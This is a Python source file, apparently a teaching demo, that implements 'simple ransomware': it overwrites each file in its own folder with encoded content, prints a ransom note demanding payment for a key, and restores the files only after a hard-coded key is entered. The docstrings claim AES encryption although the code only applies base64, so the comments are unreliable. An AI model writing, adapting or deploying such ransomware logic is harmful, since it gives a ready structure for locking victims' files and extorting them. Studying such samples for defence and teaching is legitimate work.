#!/usr/bin/env python3

""" Implementation of simple ransomware in Python.
"""

import logging
import os
import sys
import base64


class Ransomware:
    """ This class represents file encrypting ransomware.
    """

    def __init__(self, name):
        self._name = name

    @property
    def name(self):
        """ Name of the malware. """
        return self._name

    @name.setter
    def name(self, new_name):
        self._name = new_name

    @property
    def key(self):
        """ Key used for encryption of data. """
        return "__ransomware_key"

    def obtain_key(self):
        """ Obtain key from a user. """
        return input("Please enter a key: ")

    def ransom_user(self):
        """ Inform user about encryption of his files. """
        print(
            "Hi, all your files has been encrypted. Please "
            "send 0.1 USD on this address to get decryption"
            " key: XYZ."
        )

    def encrypt_file(self, filename):
        """ Encrypt the given file with AES encryption algoritm.
        :param str filename: Name of the file.
        """
        # Load the content of file.
        with open(filename, 'r') as file:
            content = file.read()
        # Encrypt the file content with base64.
        encrypted_data = base64.b64encode(content.encode('utf-8'))
        # Rewrite the file with the encoded content.
        with open(filename, 'w') as file:
            file.write(encrypted_data.decode('utf-8'))

    def decrypt_file(self, key, filename):
        """ Decrypt the given file with AES encryption algoritm.
        :param str key: Decryption key.
        :param str filename: Name of the file.
        """
        # Load the content of file.
        with open(filename, 'r') as file:
            content = file.read()
        # Decrypt the file content.
        decrypted_data = base64.b64decode(content)
        # Rewrite the file with the encoded content.
        with open(filename, 'w') as file:
            content = file.write(decrypted_data.decode('utf-8'))

    def get_files_in_folder(self, path):
        """ Returns a `list` of all files in the folder.

        :param str path: Path to the folder
        """
        # List the directory to get all files.
        files = []
        for file in os.listdir(path):
            # For the demostration purposes ignore README.md
            # from the repository and this file.
            if file == 'README.md' or file == sys.argv[0]:
                continue

            file_path = os.path.join(path, file)
            if os.path.isfile(file_path):
                files.append(file_path)

        return files

    def encrypt_files_in_folder(self, path):
        """ Encrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be encrypted.
        :returns: Number of encrypted files (`int`).
        """
        num_encrypted_files = 0
        files = self.get_files_in_folder(path)

        # Encrypt each file in the directory.
        for file in files:
            logging.debug('Encrypting file: {}'.format(file))
            self.encrypt_file(file)
            num_encrypted_files += 1

        self.ransom_user()

        return num_encrypted_files

    def decrypt_files_in_folder(self, path):
        """ Decrypt all files in the given directory specified
        by path.

        :param str path: Path of the folder to be decrypted.
        """
        # Obtain a key from the user.
        key = self.obtain_key()
        if key != self.key:
            print('Wrong key!')
            return

        files = self.get_files_in_folder(path)

        # Decrypt each file in the directory.
        for file in files:
            self.decrypt_file(key, file)


if __name__ == '__main__':
    logging.basicConfig(level=logging.DEBUG)

    # Create ransomware.
    ransomware = Ransomware('SimpleRansomware')

    # Encrypt files located in the same folder as our ransomware.
    path = os.path.dirname(os.path.abspath(__file__))
    number_encrypted_files = ransomware.encrypt_files_in_folder(path)
    print('Number of encrypted files: {}'.format(number_encrypted_files))

    ransomware.decrypt_files_in_folder(path)
